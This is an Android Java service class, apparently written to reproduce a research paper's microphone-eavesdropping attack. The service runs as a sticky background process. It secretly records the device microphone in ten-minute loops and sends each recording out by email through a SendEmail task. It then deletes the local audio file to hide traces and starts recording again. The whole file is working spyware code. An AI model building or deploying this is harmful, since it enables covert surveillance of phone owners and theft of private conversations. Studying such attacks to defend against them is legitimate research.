package com.research.microphoneeavesdropping;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.io.IOException;

/**
 * Service implementation for pre-Android 9.0 testing
 * Uses standard Service instead of JobIntentService
 */
public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    private MediaRecorder recorder;
    private File audioFile;
    private boolean isRecording = false;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");

        if (!isRecording) {
            startRecording();
        }

        // Return sticky to ensure service continues running
        return START_STICKY;
    }

    private void startRecording() {
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        // Create file in external storage as mentioned in paper
        audioFile = new File(Environment.getExternalStorageDirectory().getPath()
                + File.separator + "audio.3gp");

        recorder.setOutputFile(audioFile.getAbsolutePath());

        try {
            recorder.prepare();
            recorder.start();
            isRecording = true;
            Log.d(TAG, "Recording started");

            // Start a thread to handle recording duration and email sending
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        // Record for set time (e.g., 10 minutes)
                        Thread.sleep(10 * 60 * 1000);
                        stopRecording();
                        sendEmail();
                        deleteFile();

                        // Restart recording
                        startRecording();
                    } catch (InterruptedException e) {
                        Log.e(TAG, "Recording interrupted", e);
                    }
                }
            }).start();

        } catch (IOException e) {
            Log.e(TAG, "Failed to start recording", e);
        }
    }

    private void stopRecording() {
        if (recorder != null && isRecording) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                isRecording = false;
                Log.d(TAG, "Recording stopped");
            } catch (Exception e) {
                Log.e(TAG, "Error stopping recording", e);
            }
        }
    }

    private void sendEmail() {
        // Execute email sending as shown in paper
        new SendEmail().execute(audioFile);
        Log.d(TAG, "Email sending initiated");
    }

    private void deleteFile() {
        // Delete the file after sending as mentioned in paper
        if (audioFile != null && audioFile.exists()) {
            boolean deleted = audioFile.delete();
            Log.d(TAG, "Audio file deleted: " + deleted);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopRecording();
        Log.d(TAG, "Service destroyed");
    }
}